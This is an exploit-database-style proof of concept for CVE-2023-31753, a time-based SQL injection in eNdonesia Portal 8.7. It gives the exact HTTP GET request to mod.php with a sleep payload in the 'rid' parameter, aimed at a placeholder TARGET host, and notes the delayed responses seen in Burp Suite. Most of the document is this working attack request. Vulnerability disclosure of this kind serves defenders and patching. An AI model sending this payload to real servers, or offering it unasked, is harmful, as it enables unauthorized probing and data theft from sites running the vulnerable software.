Proof of Concept for CVE-2023-31753

Description: A SQL Injection vulnerability was discovered in eNdonesia Portal v8.7 which is exploited upon inserting crafted payload into "rid" parameter in diskusi.php.

*  Exploit Title: eNdonesia Portal 8.7 - SQL injection vulnerability in diskusi.php (rid parameter)
* Date: May 19, 2023
* Exploit Author: Kunal Khubchandani
* Vendor Homepage: http://www.endonesia.org/
* Software Link: https://sourceforge.net/projects/endonesia/
* Version: 8.7
* Category: Webapps
* Tested on: WiN11_x64/KaLiLinuX_x64
* CVE : CVE-2023-31753

#POC:

1. To exploit this vulnerability, one must send a SQLi sleep payload as a value of "rid" GET Parameter in the following HTTP request.

2. Vulnerable Request:

GET /endonesia.8.7.en/mod.php?mod=diskusi&op=delres&rid=(select*from(select(sleep(20)))a) HTTP/1.1 <br />
Host: TARGET <br />
Accept-Encoding: gzip, deflate<br />
Accept: */* <br />
Accept-Language: en-US;q=0.9,en;q=0.8 <br />
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36 <br />
Connection: close <br />
Cache-Control: max-age=0 <br />

3. Upon sending the above http request through Burp Suite, the user will receive a response with a 20 seconds delay.

** 20 Seconds Delay:

![image](https://github.com/khmk2k/CVE-2023-31753/assets/30557644/f81923f3-d8e1-48b6-8f4b-2b03fc27db0b)

** 30 Seconds Delay:

![image](https://github.com/khmk2k/CVE-2023-31753/assets/30557644/5fa70ae4-a730-4fa8-b3a6-5fcf00970bfb)
